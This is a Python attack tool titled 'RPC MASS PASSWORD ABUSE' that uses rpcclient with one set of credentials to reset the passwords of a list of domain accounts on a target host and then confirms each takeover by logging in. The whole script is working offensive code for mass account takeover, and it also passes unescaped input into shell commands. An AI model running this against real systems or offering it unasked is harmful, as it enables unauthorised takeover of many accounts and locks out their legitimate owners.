#!/usr/bin/python

import subprocess
import argparse
import sys

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def validate_current_user_password(username, password, target_ip):
    cmd = f"rpcclient -U '{username}%{password}' -c 'enumdomusers' {target_ip}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    success = "user:[" in result.stdout.lower()
    if not success:
        print(f"Authentication failed. Error message: {result.stderr}")
    return success

def attempt_password_change(username, password, target_ip, target_user, new_password, debug):
    cmd = f"rpcclient -N {target_ip} -U '{username}%{password}' -c 'setuserinfo2 {target_user} 23 \"{new_password}\"'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    output = result.stdout.lower() + result.stderr.lower()
    
    if debug:
        print(f"Debug - rpcclient output for {target_user}:")
        print(output)
    
    if "nt_status_access_denied" in output:
        return False
    return output.strip() == ''

def validate_password_with_rpcclient(target_ip, username, password):
    cmd = f"rpcclient -N {target_ip} -U '{username}%{password}' -c 'getusername; quit'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return "Authority" in result.stdout

def test_password_change(username, password, target_ip, target_users, new_password, log_file, debug):
    results = {}

    print(f"\tValidating credentials for user: {username}")
    if not validate_current_user_password(username, password, target_ip):
        print(f"\tError: Unable to authenticate as {username}. Please check your credentials and ensure the target is reachable.")
        sys.exit(1)
    print("\tAuthentication successful.\n")

    current_user_lower = username.lower()

    print("\n\nAttempting password changes:")
    for target_user in target_users:
        if target_user.lower() == current_user_lower:
            print(f"{YELLOW}[*] {target_user}: Current user (skipped){RESET}")
            results[target_user] = "Current user (skipped)"
            continue

        change_attempt = attempt_password_change(username, password, target_ip, target_user, new_password, debug)
        if change_attempt:
            validation = validate_password_with_rpcclient(target_ip, target_user, new_password)
            if validation:
                print(f"{GREEN}[+] {target_user}: Success{RESET}")
                results[target_user] = "Success"
            else:
                print(f"{RED}[-] {target_user}: Failed (Change succeeded but validation failed){RESET}")
                results[target_user] = "Failed (Change succeeded but validation failed)"
        else:
            print(f"{RED}[-] {target_user}: Failed{RESET}")
            results[target_user] = "Failed"

    with open(log_file, 'w') as file:
        file.write("Password Change Attempts:\n")
        for target_user, result in results.items():
            file.write(f"{target_user}: {result}\n")

    print(f"\nResults logged to {log_file}")

    return results

def main():
    parser = argparse.ArgumentParser(description="Test password change capabilities using rpcclient.")
    parser.add_argument("-u", "--username", required=True, help="Username to authenticate with")
    parser.add_argument("-p", "--password", required=True, help="Password for authentication")
    parser.add_argument("-t", "--target", required=True, help="IP address of the target machine")
    parser.add_argument("-f", "--file", required=True, help="File containing list of target users")
    parser.add_argument("-np", "--new-password", required=True, help="New password to set for target users")
    parser.add_argument("-l", "--log", default="password_change_results.log", help="File to log results (default: password_change_results.log)")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")

    args = parser.parse_args()

    try:
        with open(args.file, 'r') as file:
            target_users = file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: Target users file '{args.file}' not found.")
        sys.exit(1)

    test_password_change(args.username, args.password, args.target, target_users, args.new_password, args.log, args.debug)

if __name__ == "__main__":
    print('')
    print('')
    print('\t\t--== RPC MASS PASSWORD ABUSE v0.1 ==--')
    print('')
    print('')
    main()